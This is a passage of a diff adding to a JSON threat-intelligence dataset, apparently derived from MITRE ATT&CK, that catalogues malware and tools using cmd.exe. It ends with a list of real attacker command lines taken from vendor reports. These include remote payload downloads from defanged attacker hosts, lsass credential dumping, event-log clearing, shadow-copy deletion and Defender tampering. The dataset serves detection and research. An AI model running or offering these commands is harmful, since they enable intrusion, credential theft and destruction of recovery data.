+        "sources": "McAfee GhostSecret https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/"
+      },
+      {
+        "name": "Pteranodon",
+        "attack_id": "S0147",
+        "evidence": "names cmd.exe",
+        "description": "Pteranodon can use `cmd.exe` for execution on victim systems.",
+        "sources": "Palo Alto Gamaredon Feb 2017 https://researchcenter.paloaltonetworks.com/2017/02/unit-42-title-gamaredon-group-toolset-evolution/; Symantec Shuckworm January 2022 https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
+      },
+      {
+        "name": "PyDCrypt",
+        "attack_id": "S1032",
+        "evidence": "names cmd.exe",
+        "description": "PyDCrypt has used `cmd.exe` for execution.",
+        "sources": "Checkpoint MosesStaff Nov 2021 https://research.checkpoint.com/2021/mosesstaff-targeting-israeli-companies/"
+      },
+      {
+        "name": "QakBot",
+        "attack_id": "S0650",
+        "evidence": "names cmd.exe",
+        "description": "QakBot can use cmd.exe to launch itself and to execute multiple C2 commands. QakBot can use MSIExec to spawn multiple cmd.exe processes.",
+        "sources": "Crowdstrike Qakbot October 2020 https://www.crowdstrike.com/blog/duck-hunting-with-falcon-complete-qakbot-zip-based-campaign/; Trend Micro Black Basta October 2022 https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html; Kaspersky QakBot September 2021 https://securelist.com/qakbot-technical-analysis/103931/; ATT QakBot April 2021 https://cybersecurity.att.com/blogs/labs-research/the-rise-of-qakbot"
+      },
+      {
+        "name": "QUADAGENT",
+        "attack_id": "S0269",
+        "evidence": "names cmd.exe",
+        "description": "QUADAGENT uses cmd.exe to execute scripts and commands on the victim’s machine.",
+        "sources": "Unit 42 QUADAGENT July 2018 https://researchcenter.paloaltonetworks.com/2018/07/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/"
+      },
+      {
+        "name": "Ragnar Locker",
+        "attack_id": "S0481",
+        "evidence": "names cmd.exe",
+        "description": "Ragnar Locker has used cmd.exe and batch scripts to execute commands.",
+        "sources": "Sophos Ragnar May 2020 https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/"
+      },
+      {
+        "name": "RansomHub",
+        "attack_id": "S1212",
+        "evidence": "names cmd.exe",
+        "description": "RansomHub can use `cmd.exe` to execute multiple commands on infected hosts.",
+        "sources": "Group-IB RansomHub FEB 2025 https://www.group-ib.com/blog/ransomhub-never-sleeps-episode-1/"
+      },
+      {
+        "name": "Raspberry Robin",
+        "attack_id": "S1130",
+        "evidence": "names cmd.exe",
+        "description": "Raspberry Robin uses cmd.exe to read and execute a file stored on an infected USB device as part of initial installation.",
+        "sources": "RedCanary RaspberryRobin 2022 https://redcanary.com/blog/threat-intelligence/raspberry-robin/"
+      },
+      {
+        "name": "RATANKBA",
+        "attack_id": "S0241",
+        "evidence": "names cmd.exe",
+        "description": "RATANKBA uses cmd.exe to execute commands.",
+        "sources": "Lazarus RATANKBA https://blog.trendmicro.com/trendlabs-security-intelligence/lazarus-campaign-targeting-cryptocurrencies-reveals-remote-controller-tool-evolved-ratankba/; RATANKBA https://www.trendmicro.com/en_us/research/17/b/ratankba-watering-holes-against-enterprises.html"
+      },
+      {
+        "name": "RCSession",
+        "attack_id": "S0662",
+        "evidence": "names cmd.exe",
+        "description": "RCSession can use `cmd.exe` for execution on compromised hosts.",
+        "sources": "Trend Micro DRBControl February 2020 https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf"
+      },
+      {
+        "name": "RDAT",
+        "attack_id": "S0495",
+        "evidence": "names cmd.exe",
+        "description": "RDAT has executed commands using cmd.exe /c.",
+        "sources": "Unit42 RDAT July 2020 https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/"
+      },
+      {
+        "name": "RedLeaves",
+        "attack_id": "S0153",
+        "evidence": "names cmd.exe",
+        "description": "RedLeaves can receive and execute commands with cmd.exe. It can also provide a reverse shell.",
+        "sources": "FireEye APT10 April 2017 https://www.fireeye.com/blog/threat-research/2017/04/apt10_menupass_grou.html; PWC Cloud Hopper Technical Annex April 2017 https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf"
+      },
+      {
+        "name": "RedLine Stealer",
+        "attack_id": "S1240",
+        "evidence": "names cmd.exe",
+        "description": "RedLine Stealer has executed windows cmd using `ErrorHandler.cmd` to create scheduled tasks.",
+        "sources": "McAfee RedLine Stealer April 2024 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/redline-stealer-a-novel-approach/"
+      },
+      {
+        "name": "Remexi",
+        "attack_id": "S0375",
+        "evidence": "names cmd.exe",
+        "description": "Remexi silently executes received commands with cmd.exe.",
+        "sources": "Securelist Remexi Jan 2019 https://securelist.com/chafer-used-remexi-malware/89538/"
+      },
+      {
+        "name": "Revenge RAT",
+        "attack_id": "S0379",
+        "evidence": "names cmd.exe",
+        "description": "Revenge RAT uses cmd.exe to execute commands and run scripts on the victim's machine.",
+        "sources": "Cofense RevengeRAT Feb 2019 https://web.archive.org/web/20200428173819/https://cofense.com/upgrades-delivery-support-infrastructure-revenge-rat-malware-bigger-threat/"
+      },
+      {
+        "name": "RGDoor",
+        "attack_id": "S0258",
+        "evidence": "names cmd.exe",
+        "description": "RGDoor uses cmd.exe to execute commands on the victim’s machine.",
+        "sources": "Unit 42 RGDoor Jan 2018 https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/"
+      },
+      {
+        "name": "Rising Sun",
+        "attack_id": "S0448",
+        "evidence": "names cmd.exe",
+        "description": "Rising Sun has executed commands using `cmd.exe /c “<command> > <%temp%>\\AM<random>. tmp” 2>&1`.",
+        "sources": "McAfee Sharpshooter December 2018 https://www.mcafee.com/enterprise/en-us/assets/reports/rp-operation-sharpshooter.pdf"
+      },
+      {
+        "name": "ROADSWEEP",
+        "attack_id": "S1150",
+        "evidence": "names cmd.exe",
+        "description": "ROADSWEEP can open cmd.exe to enable command execution.",
+        "sources": "Mandiant ROADSWEEP August 2022 https://cloud.google.com/blog/topics/threat-intelligence/likely-iranian-threat-actor-conducts-politically-motivated-disruptive-activity-against/; Microsoft Albanian Government Attacks September 2022 https://www.microsoft.com/en-us/security/blog/2022/09/08/microsoft-investigates-iranian-attacks-against-the-albanian-government/"
+      },
+      {
+        "name": "RobbinHood",
+        "attack_id": "S0400",
+        "evidence": "names cmd.exe",
+        "description": "RobbinHood uses cmd.exe on the victim's computer.",
+        "sources": "CarbonBlack RobbinHood May 2019 https://www.carbonblack.com/2019/05/17/cb-tau-threat-intelligence-notification-robbinhood-ransomware-stops-181-windows-services-before-encryption/"
+      },
+      {
+        "name": "Ryuk",
+        "attack_id": "S0446",
+        "evidence": "names cmd.exe",
+        "description": "Ryuk has used cmd.exe to create a Registry entry to establish persistence.",
+        "sources": "CrowdStrike Ryuk January 2019 https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/"
+      },
+      {
+        "name": "Saint Bot",
+        "attack_id": "S1018",
+        "evidence": "names cmd.exe",
+        "description": "Saint Bot has used `cmd.exe` and `.bat` scripts for execution.",
+        "sources": "Palo Alto Unit 42 OutSteel SaintBot February 2022  https://unit42.paloaltonetworks.com/ukraine-targeted-outsteel-saintbot/"
+      },
+      {
+        "name": "Sakula",
+        "attack_id": "S0074",
+        "evidence": "names cmd.exe",
+        "description": "Sakula calls cmd.exe to run various DLL files via rundll32. Some Sakula samples use cmd.exe to delete temporary files. Sakula calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup. Sakula also has the capability to invoke a reverse shell.",
+        "sources": "Dell Sakula http://www.secureworks.com/cyber-threat-intelligence/threats/sakula-malware-family/"
+      },
+      {
+        "name": "SampleCheck5000",
+        "attack_id": "S1168",
+        "evidence": "names cmd.exe",
+        "description": "SampleCheck5000 can call cmd.exe to execute C2 command line strings.",
+        "sources": "ESET OilRig Downloaders DEC 2023 https://www.welivesecurity.com/en/eset-research/oilrig-persistent-attacks-cloud-service-powered-downloaders/; ESET OilRig Campaigns Sep 2023 https://www.welivesecurity.com/en/eset-research/oilrigs-outer-space-juicy-mix-same-ol-rig-new-drill-pipes/"
+      },
+      {
+        "name": "Sardonic",
+        "attack_id": "S1085",
+        "evidence": "names cmd.exe",
+        "description": "Sardonic has the ability to run `cmd.exe` or other interactive processes on a compromised computer.",
+        "sources": "Symantec FIN8 Jul 2023 https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/syssphinx-fin8-backdoor"
+      },
+      {
+        "name": "Seasalt",
+        "attack_id": "S0345",
+        "evidence": "names cmd.exe",
+        "description": "Seasalt uses cmd.exe to create a reverse shell on the infected endpoint.",
+        "sources": "Mandiant APT1 Appendix https://www.mandiant.com/sites/default/files/2021-09/mandiant-apt1-report.pdf"
+      },
+      {
+        "name": "ServHelper",
+        "attack_id": "S0382",
+        "evidence": "names cmd.exe",
+        "description": "ServHelper can execute shell commands against cmd.",
+        "sources": "Proofpoint TA505 Jan 2019 https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505; Deep Instinct TA505 Apr 2019 https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload"
+      },
+      {
+        "name": "SharpDisco",
+        "attack_id": "S1089",
+        "evidence": "names cmd.exe",
+        "description": "SharpDisco can use `cmd.exe` to execute plugins and to send command output to specified SMB shares.",
+        "sources": "MoustachedBouncer ESET August 2023 https://www.welivesecurity.com/en/eset-research/moustachedbouncer-espionage-against-foreign-diplomats-in-belarus/"
+      },
+      {
+        "name": "Small Sieve",
+        "attack_id": "S1035",
+        "evidence": "names cmd.exe",
+        "description": "Small Sieve can use `cmd.exe` to execute commands on a victim's system.",
+        "sources": "NCSC GCHQ Small Sieve Jan 2022 https://www.ncsc.gov.uk/files/NCSC-Malware-Analysis-Report-Small-Sieve.pdf"
+      },
+      {
+        "name": "Spark",
+        "attack_id": "S0543",
+        "evidence": "names cmd.exe",
+        "description": "Spark can use cmd.exe to run commands.",
+        "sources": "Unit42 Molerat Mar 2020 https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/"
+      },
+      {
+        "name": "Squirrelwaffle",
+        "attack_id": "S1030",
+        "evidence": "names cmd.exe",
+        "description": "Squirrelwaffle has used `cmd.exe` for execution.",
+        "sources": "Netskope Squirrelwaffle Oct 2021 https://www.netskope.com/blog/squirrelwaffle-new-malware-loader-delivering-cobalt-strike-and-qakbot"
+      },
+      {
+        "name": "STARWHALE",
+        "attack_id": "S1037",
+        "evidence": "names cmd.exe",
+        "description": "STARWHALE has the ability to execute commands via `cmd.exe`. STARWHALE has the ability to create the following Windows service to establish persistence on an infected host: `sc create Windowscarpstss binpath= \"cmd.exe /c cscript.exe c:\\windows\\system32\\w7_1.wsf humpback_whale\" start= \"auto\" obj= \"LocalSystem\"`.",
+        "sources": "Mandiant UNC3313 Feb 2022 https://www.mandiant.com/resources/telegram-malware-iranian-espionage"
+      },
+      {
+        "name": "StrifeWater",
+        "attack_id": "S1034",
+        "evidence": "names cmd.exe",
+        "description": "StrifeWater can execute shell commands using `cmd.exe`.",
+        "sources": "Cybereason StrifeWater Feb 2022 https://www.cybereason.com/blog/research/strifewater-rat-iranian-apt-moses-staff-adds-new-trojan-to-ransomware-operations"
+      },
+      {
+        "name": "SYSCON",
+        "attack_id": "S0464",
+        "evidence": "names cmd.exe",
+        "description": "SYSCON has the ability to execute commands through cmd on a compromised host.",
+        "sources": "Unit 42 CARROTBAT January 2020 https://unit42.paloaltonetworks.com/the-fractured-statue-campaign-u-s-government-targeted-in-spear-phishing-attacks/"
+      },
+      {
+        "name": "SystemBC",
+        "attack_id": "S9001",
+        "evidence": "names cmd.exe",
+        "description": "SystemBC has used `cmd.exe` to execute VBS scripts, BAT scripts and CMD scripts.",
+        "sources": "SophosGnGal_SystemBC_Dec2020 https://news.sophos.com/en-us/2020/12/16/systembc/"
+      },
+      {
+        "name": "Taidoor",
+        "attack_id": "S0011",
+        "evidence": "names cmd.exe",
+        "description": "Taidoor can copy cmd.exe into the system temp folder.",
+        "sources": "CISA MAR-10292089-1.v2 TAIDOOR August 2021 https://us-cert.cisa.gov/ncas/analysis-reports/ar20-216a"
+      },
+      {
+        "name": "TAMECAT",
+        "attack_id": "S1193",
+        "evidence": "names cmd.exe",
+        "description": "TAMECAT has used `cmd.exe` to run the `curl` command.",
+        "sources": "Mandiant APT42-untangling https://cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations"
+      },
+      {
+        "name": "TEXTMATE",
+        "attack_id": "S0146",
+        "evidence": "names cmd.exe",
+        "description": "TEXTMATE executes cmd.exe to provide a reverse shell to adversaries.",
+        "sources": "Cisco DNSMessenger March 2017 http://blog.talosintelligence.com/2017/03/dnsmessenger.html; FireEye FIN7 March 2017 https://web.archive.org/web/20180808125108/https:/www.fireeye.com/blog/threat-research/2017/03/fin7_spear_phishing.html"
+      },
+      {
+        "name": "TONESHELL",
+        "attack_id": "S1239",
+        "evidence": "names cmd.exe",
+        "description": "TONESHELL has created a reverse shell using `cmd.exe`.",
+        "sources": "2025_IBM_PUBLOAD_TONESHELL_HIUPAN_CLAIMLOADER_MUSTANG PANDA https://www.ibm.com/think/x-force/hive0154-targeting-us-philippines-pakistan-taiwan; Zscaler https://www.zscaler.com/blogs/security-research/latest-mustang-panda-arsenal-toneshell-and-starproxy-p1"
+      },
+      {
+        "name": "Trojan.Karagany",
+        "attack_id": "S0094",
+        "evidence": "names cmd.exe",
+        "description": "Trojan.Karagany can perform reconnaissance commands on a victim machine via a cmd.exe process.",
+        "sources": "Secureworks Karagany July 2019 https://www.secureworks.com/research/updated-karagany-malware-targets-energy-sector"
+      },
+      {
+        "name": "Turian",
+        "attack_id": "S0647",
+        "evidence": "names cmd.exe",
+        "description": "Turian can create a remote shell and execute commands using cmd.",
+        "sources": "ESET BackdoorDiplomacy Jun 2021 https://www.welivesecurity.com/2021/06/10/backdoordiplomacy-upgrading-quarian-turian/"
+      },
+      {
+        "name": "UPPERCUT",
+        "attack_id": "S0275",
+        "evidence": "names cmd.exe",
+        "description": "UPPERCUT uses cmd.exe to execute commands on the victim’s machine.",
+        "sources": "FireEye APT10 Sept 2018 https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html"
+      },
+      {
+        "name": "Vidar",
+        "attack_id": "S9050",
+        "evidence": "names cmd.exe",
+        "description": "Vidar has used the function `TerminateProcess` to terminate processes. Vidar has forcefully terminated a process named Devil.exe using the command `C:\\Windows\\System32\\cmd.exe” /c taskkill /im Devil.exe /f`.",
+        "sources": "Cyfirma_Vidar_June2024 https://www.cyfirma.com/research/vidar-stealer-an-in-depth-analysis-of-an-information-stealing-malware/; Logpoint_StealerMalwareFamilies_2024 https://web.archive.org/web/20240517205011/https://www.logpoint.com/wp-content/uploads/2024/03/logpoint-etpr-a-comprehensive-overview-on-stealer-malware-families-1.pdf"
+      },
+      {
+        "name": "WarzoneRAT",
+        "attack_id": "S0670",
+        "evidence": "names cmd.exe",
+        "description": "WarzoneRAT can use `cmd.exe` to execute malicious code.",
+        "sources": "Check Point Warzone Feb 2020 https://research.checkpoint.com/2020/warzone-behind-the-enemy-lines/"
+      },
+      {
+        "name": "WastedLocker",
+        "attack_id": "S0612",
+        "evidence": "names cmd.exe",
+        "description": "WastedLocker has used cmd to execute commands on the system.",
+        "sources": "NCC Group WastedLocker June 2020 https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/"
+      },
+      {
+        "name": "WhisperGate",
+        "attack_id": "S0689",
+        "evidence": "names cmd.exe",
+        "description": "WhisperGate can use `cmd.exe` to execute commands.",
+        "sources": "Unit 42 WhisperGate January 2022 https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/#whispergate-malware-family"
+      },
+      {
+        "name": "WINERACK",
+        "attack_id": "S0219",
+        "evidence": "names cmd.exe",
+        "description": "WINERACK can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.",
+        "sources": "FireEye APT37 Feb 2018 https://services.google.com/fh/files/misc/apt37-reaper-the-overlooked-north-korean-actor.pdf"
+      },
+      {
+        "name": "Winnti for Windows",
+        "attack_id": "S0141",
+        "evidence": "names cmd.exe",
+        "description": "Winnti for Windows can set the timestamps for its worker and service components to match that of cmd.exe.",
+        "sources": "Novetta Winnti April 2015 https://web.archive.org/web/20150412223949/http://www.novetta.com/wp-content/uploads/2015/04/novetta_winntianalysis.pdf"
+      },
+      {
+        "name": "Woody RAT",
+        "attack_id": "S1065",
+        "evidence": "names cmd.exe",
+        "description": "Woody RAT can execute commands using `cmd.exe`.",
+        "sources": "MalwareBytes WoodyRAT Aug 2022 https://www.malwarebytes.com/blog/threat-intelligence/2022/08/woody-rat-a-new-feature-rich-malware-spotted-in-the-wild"
+      },
+      {
+        "name": "Zebrocy",
+        "attack_id": "S0251",
+        "evidence": "names cmd.exe",
+        "description": "Zebrocy uses cmd.exe to execute commands on the system.",
+        "sources": "ESET Zebrocy May 2019 https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/; CISA Zebrocy Oct 2020 https://us-cert.cisa.gov/ncas/analysis-reports/ar20-303b"
+      }
+    ],
+    "associated_tools": [
+      {
+        "name": "Brute Ratel C4",
+        "attack_id": "S1063",
+        "evidence": "names cmd.exe",
+        "description": "Brute Ratel C4 can use cmd.exe for execution.",
+        "sources": "Palo Alto Brute Ratel July 2022 https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/"
+      },
+      {
+        "name": "Empire",
+        "attack_id": "S0363",
+        "evidence": "names cmd.exe",
+        "description": "Empire can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe.",
+        "sources": "Github PowerShell Empire https://github.com/PowerShellEmpire/Empire"
+      },
+      {
+        "name": "MCMD",
+        "attack_id": "S0500",
+        "evidence": "names cmd.exe",
+        "description": "MCMD can launch a console process (cmd.exe) with redirected standard input and output.",
+        "sources": "Secureworks MCMD July 2019 https://www.secureworks.com/research/mcmd-malware-analysis"
+      },
+      {
+        "name": "SILENTTRINITY",
+        "attack_id": "S0692",
+        "evidence": "names cmd.exe",
+        "description": "SILENTTRINITY can use `cmd.exe` to enable lateral movement using DCOM.",
+        "sources": "GitHub SILENTTRINITY Modules July 2019 https://github.com/byt3bl33d3r/SILENTTRINITY/tree/master/silenttrinity/core/teamserver/modules/boo"
+      }
+    ],
+    "technique_only": [],
+    "associated_commands": [
+      {
+        "command": "cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v lsm /t reg_sz /d \"%appdata%\\lsm.exe\" /f",
+        "intent": "Persistence: the pisloader dropper adds a Run key so its payload (%appdata%\\lsm.exe) starts at each logon.",
+        "status": "verified",
+        "source_name": "PaloAlto DNS Requests May 2016",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2016/05/unit42-new-wekby-attacks-use-dns-requests-as-command-and-control-mechanism/"
+      },
+      {
+        "command": "cmd /c bitsadmin /transfer bbbb hxxp://66.42.98[.]220:12345/test/install.bat C:\\Users\\Public\\install.bat",
+        "intent": "Download a batch file from APT41 infrastructure with BITSAdmin after exploiting ManageEngine Desktop Central; it installs a Cobalt Strike BEACON loader.",
+        "status": "verified",
+        "source_name": "FireEye APT41 March 2020",
+        "source_url": "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+      },
+      {
+        "command": "cmd.exe /c wscript.exe //b /e:jscript %TEMP%\\crashpad.ini",
+        "intent": "Run the BATELEUR JScript payload, hidden in %TEMP%\\crashpad.ini, from a malicious document.",
+        "status": "verified",
+        "source_name": "FireEye FIN7 Aug 2018",
+        "source_url": "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
+      },
+      {
+        "command": "cmd.exe /Q /c powershell -nop -ep bypass -c CSIDL_SYSTEM_DRIVE\\shvnc.ps1 1> \\\\127.0.0.1\\ADMIN$\\__1671129123.2520242 2>&1",
+        "intent": "Launch a new PowerShell backdoor through Impacket's wmiexec, with output written to the ADMIN$ share.",
+        "status": "verified",
+        "source_name": "Symantec FIN8 Jul 2023",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/syssphinx-fin8-backdoor"
+      },
+      {
+        "command": "\"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_SYSTEM\\mshta.exe hxxp://fiordan[.]ru/FILM.html /f id=[REDACTED]",
+        "intent": "Execute an HTA file hosted on the attackers' server with mshta.exe, alongside a new Pterodo variant.",
+        "status": "verified",
+        "source_name": "Symantec Shuckworm January 2022",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
+      },
+      {
+        "command": "cmd /c cd /d E:\\\\logs&procdump64.exe -accepteula -ma lsass.exe lsass.dmp&echo [S]&cd&echo [E]",
+        "intent": "Credential access: write the memory of lsass.exe to disk with ProcDump, run through the China Chopper webshell.",
+        "status": "verified",
+        "source_name": "Rapid7 HAFNIUM Mar 2021",
+        "source_url": "https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/"
+      },
+      {
+        "command": "cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client&msiexec /q /i hxxp://103.212.223[.]210:9900/nvidia.msi&echo [S]&cd&echo [E]",
+        "intent": "Fetch and silently install a second-stage payload (MSI) through the China Chopper webshell.",
+        "status": "verified",
+        "source_name": "Rapid7 HAFNIUM Mar 2021",
+        "source_url": "https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/"
+      },
+      {
+        "command": "CMD /c for /f %x in ('wevtutil el') do wevtutil cl %x",
+        "intent": "Cover tracks: clear every Windows event log on the Exchange server.",
+        "status": "verified",
+        "source_name": "Rapid7 HAFNIUM Mar 2021",
+        "source_url": "https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/"
+      },
+      {
+        "command": "cmd.exe /c ipconfig/all >>\"%s\" & arp -a >>\"%s\"",
+        "intent": "Discovery: save the network configuration and ARP table to a file for the attackers.",
+        "status": "verified",
+        "source_name": "Talos Kimsuky Nov 2021",
+        "source_url": "https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html"
+      },
+      {
+        "command": "cmd.exe /c ping.exe 8.8.8.8 -n 70&&\"%temp%\\FontEDL.exe\"",
+        "intent": "Wait about 70 seconds with ping, then start the benign executable that sideloads the PlugX loader DLL.",
+        "status": "verified",
+        "source_name": "Cisco Talos MUSTANG PANDA PLUGX PUBLOAD MAY 2022",
+        "source_url": "https://blog.talosintelligence.com/mustang-panda-targets-europe/"
+      },
+      {
+        "command": "cmd.exe /c cipher /W:C",
+        "intent": "Anti-forensics: securely wipe free space on drive C: so deleted files cannot be recovered.",
+        "status": "verified",
+        "source_name": "Nearest Neighbor Volexity",
+        "source_url": "https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/"
+      },
+      {
+        "command": "cmd.exe /c whoami > c:\\progra~1\\common~1\\micros~1\\webser~1\\16\\template\\layouts\\info.js",
+        "intent": "Check that commands run through the new SharePoint webshell by writing whoami output to a web-accessible file.",
+        "status": "verified",
+        "source_name": "SentinelOne ToolShell JUL 2025",
+        "source_url": "https://www.sentinelone.com/blog/sharepoint-toolshell-zero-day-exploited-in-the-wild-targets-enterprise-servers/"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /C csrss.exe -h breached.contoso.com -f (name=”Domain Admins”) member -list | csrss.exe -h breached.contoso.com -f objectcategory=* > .\\Mod\\mod1.log",
+        "intent": "Domain discovery with a copy of AdFind renamed to csrss.exe: list Domain Admins members and all directory objects.",
+        "status": "verified",
+        "source_name": "Microsoft Analyzing Solorigate Dec 2020",
+        "source_url": "https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/"
+      },
+      {
+        "command": "cmd.exe /c C:\\Windows\\SysNative\\vssadmin.exe delete shadows /all /quiet",
+        "intent": "Inhibit recovery: Black Basta deletes all shadow copies before encrypting files.",
+        "status": "verified",
+        "source_name": "Deep Instinct Black Basta August 2022",
+        "source_url": "https://www.deepinstinct.com/blog/black-basta-ransomware-threat-emergence"
+      },
+      {
+        "command": "cmd.exe /C schtasks /create /F /sc minute /mo 1 /tn \"\\WindowsAppPool\\AppPool\" /tr \"wscript /b \"C:\\ProgramData\\WindowsAppPool\\AppPool.vbs\"\"",
+        "intent": "Persistence: create a scheduled task that runs the BONDUPDATER VBScript every minute.",
+        "status": "verified",
+        "source_name": "Palo Alto OilRig Sep 2018",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/"
+      },
+      {
+        "command": "cmd /C fsutil behavior set SymlinkEvaluation R2R:1",
+        "intent": "Allow remote-to-remote symbolic links so the ransomware can reach files on other network shares.",
+        "status": "verified",
+        "source_name": "Cisco Talos Qilin Ransomware OCT 2025",
+        "source_url": "https://blog.talosintelligence.com/uncovering-qilin-attack-methods-exposed-through-multiple-cases/"
+      },
+      {
+        "command": "C:\\\\Windows\\\\System32\\\\cmd.exe /q /c bcdedit /set {default} recoveryenabled no",
+        "intent": "Inhibit recovery: disable Windows automatic recovery before encryption.",
+        "status": "verified",
+        "source_name": "Cyble Embargo Ransomware May 2024",
+        "source_url": "https://cyble.com/blog/the-rust-revolution-new-embargo-ransomware-steps-in/"
+      },
+      {
+        "command": "cmd.exe /c “C:\\Windows\\System32\\rundll32.exe “C:\\Sun\\Thumbs.db”,#1",
+        "intent": "Run the GreyEnergy DLL in memory through rundll32, launched as SYSTEM with PsExec.",
+        "status": "verified",
+        "source_name": "ESET GreyEnergy Oct 2018",
+        "source_url": "https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf"
+      },
+      {
+        "command": "cmd /c taskkill /f /im winword.exe&taskkill /f /im Excel.exe&taskkill /f /im MSPUB.exe&taskkill /f /im POWERPNT.EXE&taskkill /f /im MSASCuiL.exe&taskkill /f /im MpCmdRun.exe&cd \"\"%ProgramFiles%\\Windows Defender\"\" & MpCmdRun.exe -removedefinitions -dynamicsignatures & exit",
+        "intent": "The delivery document macro runs it to kill Office and Windows Defender processes and clear the Defender detection definitions.",
+        "status": "verified",
+        "source_name": "Unit 42 Gorgon Group August 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/08/unit42-gorgon-group-slithering-nation-state-cybercrime/"
+      },
+      {
+        "command": "cmd /c set /p=Set v=CreateObject(^\"Wscript.Shell^\"):v.Run ^\"msiexec /q /i hxxp://199.247.6[.]253/ud^\",false,0 <nul > C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs & schtasks /create /sc MINUTE /tn \"Windows System\" /tr \"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\" /mo 2 /F",
+        "intent": "Stored in the Excel document's Company property, it writes a VBScript with set /p that fetches the next stage with msiexec and schedules it every two minutes.",
+        "status": "verified",
+        "source_name": "Unit 42 Rancor June 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+      },
+      {
+        "command": "cmd.exe /c \"tasklist > C:\\Windows\\TEMP\\outlog.txt && netstat -nao >> C:\\Windows\\TEMP\\outlog.txt && netstat -r >> C:\\Windows\\TEMP\\outlog.txt && arp -a >> C:\\Windows\\TEMP\\outlog.txt && dir /s /b C:\\Users >> C:\\Windows\\TEMP\\outlog.txt\"",
+        "intent": "Run remotely with PsExec on many machines to write running processes, network connections, routing table, ARP cache and user directory contents to outlog.txt.",
+        "status": "verified",
+        "source_name": "CERT Polska Energy Sector Incident Report",
+        "source_url": "https://cert.pl/uploads/docs/CERT_Polska_Energy_Sector_Incident_Report_2025.pdf"
+      },
+      {
+        "command": "cmd.exe /C netsh advfirewall firewall add rule name=\"Remote Event Log Management SMB\" dir=in action=allow protocol=tcp localport=12345 > C:\\Windows\\Temp\\MSI28122Ac.LOG 2>&1",
+        "intent": "Used with netsh port forwards to pivot from the guest Wi-Fi network back to the corporate wired network.",
+        "status": "verified",
+        "source_name": "Volexity Nearest Neighbor Attack November 2024",
+        "source_url": "https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/"
+      },
+      {
+        "command": "cmd.exe /C netsh interface portproxy add v4tov4 listenaddress=172.33.xx.xx listenport=12345 connectaddress=172.20.xx.xx connectport=445 > C:\\Windows\\Temp\\MSI2cBfA24.LOG 2>&1",
+        "intent": "Sets up a port forward to SMB on a target system so the attacker could reach it from the guest Wi-Fi network.",
+        "status": "verified",
+        "source_name": "Volexity Nearest Neighbor Attack November 2024",
+        "source_url": "https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/"
+      },
+      {
